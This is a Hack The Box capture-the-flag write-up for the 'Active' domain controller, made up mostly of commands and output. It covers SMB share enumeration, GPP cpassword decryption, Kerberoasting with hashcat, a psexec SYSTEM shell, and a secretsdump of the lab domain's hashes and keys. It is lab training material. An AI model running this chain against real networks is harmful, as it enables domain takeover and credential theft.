---
tags:
  - windows
---
# HTB: [Active](https://app.hackthebox.com/machines/Active)

> [!tip]- Summary with Spoilers
> 1. **Group Policy Preferences (GPP) `cpassword` exploit**
> I discovered a `cpassword` attribute in a `Groups.xml` file on the Replication share. Because the AES key for GPP was leaked, I could reverse this field, which revealed valid domain credentials.
>
> 2. **Kerberoasting**
> With those credentials in hand, I used `GetUserSPNs` to request service tickets for privileged accounts, specifically Administrator. I then cracked the TGS hashes offline with hashcat, recovering the Administrator’s plaintext password.
>
> 3. **Remote code execution**
> Armed with the Administrator password, I used Impacket’s `psexec` to get an NT AUTHORITY\SYSTEM shell on the target (Windows Server 2008 R2). This granted me full administrative control over the system.
>
> 4. **Dumping domain secrets**
> Finally, I ran `secretsdump` to extract all hashed passwords and Kerberos keys (NTDS.dit and LSA secrets), achieving complete control over the domain.

## Services

### TCP

`nmap` TCP scan:

```text
# Nmap 7.94SVN scan initiated Sat Aug 31 11:42:11 2024 as: nmap -v --reason -Pn -T4 --min-rate 10000 -p- --open -sCV -oN nmap_tcp-t.txt t
Nmap scan report for t (10.10.10.100)
Host is up, received user-set (0.092s latency).
Not shown: 58845 closed tcp ports (reset), 6667 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-08-31 17:42:33Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  tcpwrapped    syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5722/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49157/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49165/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49166/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49168/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2024-08-31T17:43:35
|_  start_date: 2024-08-31T17:39:07
| smb2-security-mode:
|   2:1:0:
|_    Message signing enabled and required

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Aug 31 11:43:44 2024 -- 1 IP address (1 host up) scanned in 93.16 seconds
```

#### 445/tcp-smb

```console
===========================
|    Shares via RPC on t    |
 ===========================
[*] Enumerating shares
[+] Found 7 share(s):
ADMIN$:
  comment: Remote Admin
  type: Disk
C$:
  comment: Default share
  type: Disk
IPC$:
  comment: Remote IPC
  type: IPC
NETLOGON:
  comment: Logon server share
  type: Disk
Replication:
  comment: ''
  type: Disk
SYSVOL:
  comment: Logon server share
  type: Disk
Users:
  comment: ''
  type: Disk
[*] Testing share ADMIN$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share C$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share IPC$
[+] Mapping: OK, Listing: DENIED
[*] Testing share NETLOGON
[+] Mapping: DENIED, Listing: N/A
[*] Testing share Replication
[+] Mapping: OK, Listing: OK
[*] Testing share SYSVOL
[+] Mapping: DENIED, Listing: N/A
[*] Testing share Users
[+] Mapping: DENIED, Listing: N/A
```

```console
$ smbclient \\\\t\\Replication
Password for [WORKGROUP\e]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 21 04:37:44 2018
  ..                                  D        0  Sat Jul 21 04:37:44 2018
  active.htb                          D        0  Sat Jul 21 04:37:44 2018

                5217023 blocks of size 4096. 239991 blocks available
smb: \> cd active.htb
smb: \active.htb\> ls
  .                                   D        0  Sat Jul 21 04:37:44 2018
  ..                                  D        0  Sat Jul 21 04:37:44 2018
  DfsrPrivate                       DHS        0  Sat Jul 21 04:37:44 2018
  Policies                            D        0  Sat Jul 21 04:37:44 2018
  scripts                             D        0  Wed Jul 18 12:48:57 2018

                5217023 blocks of size 4096. 237840 blocks available
smb: \active.htb\> cd scripts
smb: \active.htb\scripts\> ls
  .                                   D        0  Wed Jul 18 12:48:57 2018
  ..                                  D        0  Wed Jul 18 12:48:57 2018

                5217023 blocks of size 4096. 236744 blocks available
smb: \active.htb\scripts\> ls -a
NT_STATUS_NO_SUCH_FILE listing \active.htb\scripts\-a
smb: \active.htb\scripts\> cd ..
smb: \active.htb\> cd Policies
smb: \active.htb\Policies\> ls
  .                                   D        0  Sat Jul 21 04:37:44 2018
  ..                                  D        0  Sat Jul 21 04:37:44 2018
  {31B2F340-016D-11D2-945F-00C04FB984F9}      D        0  Sat Jul 21 04:37:44 2018
  {6AC1786C-016F-11D2-945F-00C04fB984F9}      D        0  Sat Jul 21 04:37:44 2018

                5217023 blocks of size 4096. 235856 blocks available
smb: \active.htb\Policies\> cd ..
smb: \active.htb\> ls
  .                                   D        0  Sat Jul 21 04:37:44 2018
  ..                                  D        0  Sat Jul 21 04:37:44 2018
  DfsrPrivate                       DHS        0  Sat Jul 21 04:37:44 2018
  Policies                            D        0  Sat Jul 21 04:37:44 2018
  scripts                             D        0  Wed Jul 18 12:48:57 2018
c
                5217023 blocks of size 4096. 235856 blocks available
smb: \active.htb\> cd DfsrPrivate
smb: \active.htb\DfsrPrivate\> ls
  .                                 DHS        0  Sat Jul 21 04:37:44 2018
  ..                                DHS        0  Sat Jul 21 04:37:44 2018
  ConflictAndDeleted                  D        0  Wed Jul 18 12:51:30 2018
  Deleted                             D        0  Wed Jul 18 12:51:30 2018
  Installing                          D        0  Wed Jul 18 12:51:30 2018

                5217023 blocks of size 4096. 235984 blocks available
smb: \active.htb\DfsrPrivate\> cd installing
smb: \active.htb\DfsrPrivate\installing\> ls
  .                                   D        0  Wed Jul 18 12:51:30 2018
  ..                                  D        0  Wed Jul 18 12:51:30 2018

                5217023 blocks of size 4096. 235984 blocks available
smb: \active.htb\DfsrPrivate\installing\> cd ../Deleted
smb: \active.htb\DfsrPrivate\Deleted\> ls
  .                                   D        0  Wed Jul 18 12:51:30 2018
  ..                                  D        0  Wed Jul 18 12:51:30 2018

                5217023 blocks of size 4096. 235984 blocks available
smb: \active.htb\DfsrPrivate\Deleted\> cd ../ConflictAndDeleted
lsmb: \active.htb\DfsrPrivate\ConflictAndDeleted\> ls
  .                                   D        0  Wed Jul 18 12:51:30 2018
  ..                                  D        0  Wed Jul 18 12:51:30 2018

                5217023 blocks of size 4096. 235574 blocks available
...
smb: \active.htb\> put test
NT_STATUS_ACCESS_DENIED opening remote file \active.htb\test
```

```console
$ nxc smb active.htb -u '' -p '' -M spider_plus -o DOWNLOAD_FLAG=True
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\:
SPIDER_PLUS 10.10.10.100    445    DC               [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.10.10.100    445    DC               [*]  DOWNLOAD_FLAG: True
SPIDER_PLUS 10.10.10.100    445    DC               [*]     STATS_FLAG: True
SPIDER_PLUS 10.10.10.100    445    DC               [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.10.10.100    445    DC               [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.10.10.100    445    DC               [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.10.10.100    445    DC               [*]  OUTPUT_FOLDER: /tmp/nxc_hosted/nxc_spider_plus
SMB         10.10.10.100    445    DC               [*] Enumerated shares
SMB         10.10.10.100    445    DC               Share           Permissions     Remark
SMB         10.10.10.100    445    DC               -----           -----------     ------
SMB         10.10.10.100    445    DC               ADMIN$                          Remote Admin
SMB         10.10.10.100    445    DC               C$                              Default share
SMB         10.10.10.100    445    DC               IPC$                            Remote IPC
SMB         10.10.10.100    445    DC               NETLOGON                        Logon server share
SMB         10.10.10.100    445    DC               Replication     READ
SMB         10.10.10.100    445    DC               SYSVOL                          Logon server share
SMB         10.10.10.100    445    DC               Users
SPIDER_PLUS 10.10.10.100    445    DC               [+] Saved share-file metadata to "/tmp/nxc_hosted/nxc_spider_plus/10.10.10.100.json".
SPIDER_PLUS 10.10.10.100    445    DC               [*] SMB Shares:           7 (ADMIN$, C$, IPC$, NETLOGON, Replication, SYSVOL, Users)
SPIDER_PLUS 10.10.10.100    445    DC               [*] SMB Readable Shares:  1 (Replication)
SPIDER_PLUS 10.10.10.100    445    DC               [*] Total folders found:  22
SPIDER_PLUS 10.10.10.100    445    DC               [*] Total files found:    7
SPIDER_PLUS 10.10.10.100    445    DC               [*] File size average:    1.16 KB
SPIDER_PLUS 10.10.10.100    445    DC               [*] File size min:        22 B
SPIDER_PLUS 10.10.10.100    445    DC               [*] File size max:        3.63 KB
SPIDER_PLUS 10.10.10.100    445    DC               [*] File unique exts:     4 (.inf, .xml, .pol, .ini)
SPIDER_PLUS 10.10.10.100    445    DC               [*] Downloads successful: 7
SPIDER_PLUS 10.10.10.100    445    DC               [+] All files processed successfully.

$ mv /tmp/nxc_hosted/nxc_spider_plus/10.10.10.100 spidered

$ find spidered/
spidered/
spidered/Replication
spidered/Replication/active.htb
spidered/Replication/active.htb/Policies
spidered/Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}
spidered/Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy
spidered/Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI
spidered/Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI
spidered/Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE
spidered/Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences
spidered/Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups
spidered/Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
spidered/Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft
spidered/Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT
spidered/Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit
spidered/Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf
spidered/Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol
spidered/Replication/active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}
spidered/Replication/active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI
spidered/Replication/active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE
spidered/Replication/active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft
spidered/Replication/active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT
spidered/Replication/active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit
spidered/Replication/active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf
```

### `enum4linux-ng`

```console
...
[+] Found OS information via 'srvinfo'
[+] After merging OS information we have the following result:
OS: Windows 7, Windows Server 2008 R2
OS version: '6.1'
OS release: ''
OS build: '7601'
Native OS: not supported
Native LAN manager: not supported
Platform id: '500'
Server type: '0x80102b'
Server type string: Wk Sv PDC Tim NT     Domain Controller
```

## Remote Code Execution

Found a `cpassword` field in a file named `Groups.xml` via leaked data on the `Replication` share.

```console
$ pwd
/home/e/htb-active/spidered/Replication/active.htb/Policies

$ grep -Ri password *
{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml:<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
```

This password is reversible thanks to Microsoft using a (leaked) AES key:

```console
$ gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
GPPstillStandingStrong2k18
```

Creds: `SVC_TGS:GPPstillStandingStrong2k18`

```console
$ nxc smb active.htb -u 'active.htb\SVC_TGS' -p 'GPPstillStandingStrong2k18' --users
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18
SMB         10.10.10.100    445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         10.10.10.100    445    DC               Administrator                 2018-07-18 19:06:40 0       Built-in account for administering the computer/domain
SMB         10.10.10.100    445    DC               Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         10.10.10.100    445    DC               krbtgt                        2018-07-18 18:50:36 0       Key Distribution Center Service Account
SMB         10.10.10.100    445    DC               SVC_TGS                       2018-07-18 20:14:38 0
```

## Privilege Escalation

Querying Bloodhound data via `bloodhound-python`:

```console
$ bloodhound-python -u svc_tgs -p 'GPPstillStandingStrong2k18' -d active.htb -ns 10.10.10.100 -c all
INFO: Found AD domain: active.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.active.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc.active.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.active.htb
INFO: Found 5 users
INFO: Found 41 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.active.htb
INFO: Done in 00M 19S
```

```console
$ impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/svc_tgs -outputfile hashes
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 13:06:40.351723  2024-09-02 12:35:05.284551



[-] CCache file is not found. Skipping...

$ cat hashes
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$bf0c16c1aa7e19c1...
```

The hash cracks easily with: `hashcat -m 13100 --force -a 0 ./hashes ~/wordlists/rockyou.txt`

```console
$ impacket-psexec Administrator:Ticketmaster1968@t
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Requesting shares on t.....
[*] Found writable share ADMIN$
[*] Uploading file kenkaAJO.exe
[*] Opening SVCManager on t.....
[*] Creating service nJLt on t.....
[*] Starting service nJLt.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

## Post-exploitation

Life after `root`.

```console
$ impacket-secretsdump Administrator:Ticketmaster1968@t
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Target system bootKey: 0xff954ee81ffb63937b563f523caf1d59
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5c15eb37006fb74c21a5d1e2144b726e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
ACTIVE\DC$:aes256-cts-hmac-sha1-96:f7c9a59d4eda70f0209c3aa084b6032bfb2f9eb46892a6f5759e5f0585e79610
ACTIVE\DC$:aes128-cts-hmac-sha1-96:2bfe4342a647f4ad14f505cc1a8f33e3
ACTIVE\DC$:des-cbc-md5:3eead091575b34ce
ACTIVE\DC$:plain_password_hex:cd09d0617fd734cdc6ea4c9938ef7f876a0fedbaed36fb354b267638235804d052ff62dd0d064a6f4ccb840fda6140480967a3bb98f4f8f3aa00a0e84c00eb3754515c6bb8323fa9f38d6ea04552f142fa2ca9c0309fcaee6f776d727f697a191ae11e02e898f8087b2444a1a0c208c8bb3d28c31dad1853a99c7970a19b6ab8795b5e6bd3bd256b0fe1983f3fa2bc8c52d648935689d925b4af59f26dd7db63d57619d6ec0458f15d1737b2ee51a918ab7fb81d8cbfbc3d7205448709b811453cd855561ea081bae76381333df3a09d7b0601185c8c003e818e8d3dc398b5770d3fdd572f64cac929840ea167b5e058
ACTIVE\DC$:aad3b435b51404eeaad3b435b51404ee:d77d990f4092174205f6fd52fd4beac8:::
[*] DefaultPassword
(Unknown User):ROOT#123
[*] DPAPI_SYSTEM
dpapi_machinekey:0x377bd35be67705f345dabf00d3181e269e0fb1e6
dpapi_userkey:0x7586c391e559565c85cb342d1d24546381f0d5cb
[*] NL$KM
 0000   CC 6F B8 46 C3 0C 58 05  2F F2 07 2E DA E6 BF 7D   .o.F..X./......}
 0010   60 63 F6 89 E7 0E D5 D5  22 EE 54 DA 63 12 5B B5   `c......".T.c.[.
 0020   D8 DA 0B B7 82 0E 3D E1  9D 7A 03 15 08 5C B0 AE   ......=..z...\..
 0030   EF 63 91 B9 6C 87 65 A8  14 62 95 BC 77 69 77 08   .c..l.e..b..wiw.
NL$KM:cc6fb846c30c58052ff2072edae6bf7d6063f689e70ed5d522ee54da63125bb5d8da0bb7820e3de19d7a0315085cb0aeef6391b96c8765a8146295bc77697708
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5ffb4aaaf9b63dc519eca04aec0e8bed:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b889e0d47d6fe22c8f0463a717f460dc:::
active.htb\SVC_TGS:1103:aad3b435b51404eeaad3b435b51404ee:f54f3a1d3c38140684ff4dad029f25b5:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:d77d990f4092174205f6fd52fd4beac8:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:003b207686cfdbee91ff9f5671aa10c5d940137da387173507b7ff00648b40d8
Administrator:aes128-cts-hmac-sha1-96:48347871a9f7c5346c356d76313668fe
Administrator:des-cbc-md5:5891549b31f2c294
krbtgt:aes256-cts-hmac-sha1-96:cd80d318efb2f8752767cd619731b6705cf59df462900fb37310b662c9cf51e9
krbtgt:aes128-cts-hmac-sha1-96:b9a02d7bd319781bc1e0a890f69304c3
krbtgt:des-cbc-md5:9d044f891adf7629
active.htb\SVC_TGS:aes256-cts-hmac-sha1-96:d59943174b17c1a4ced88cc24855ef242ad328201126d296bb66aa9588e19b4a
active.htb\SVC_TGS:aes128-cts-hmac-sha1-96:f03559334c1111d6f792d74a453d6f31
active.htb\SVC_TGS:des-cbc-md5:d6c7eca70862f1d0
DC$:aes256-cts-hmac-sha1-96:f7c9a59d4eda70f0209c3aa084b6032bfb2f9eb46892a6f5759e5f0585e79610
DC$:aes128-cts-hmac-sha1-96:2bfe4342a647f4ad14f505cc1a8f33e3
DC$:des-cbc-md5:341a9d9decdf9783
[*] Cleaning up...
```
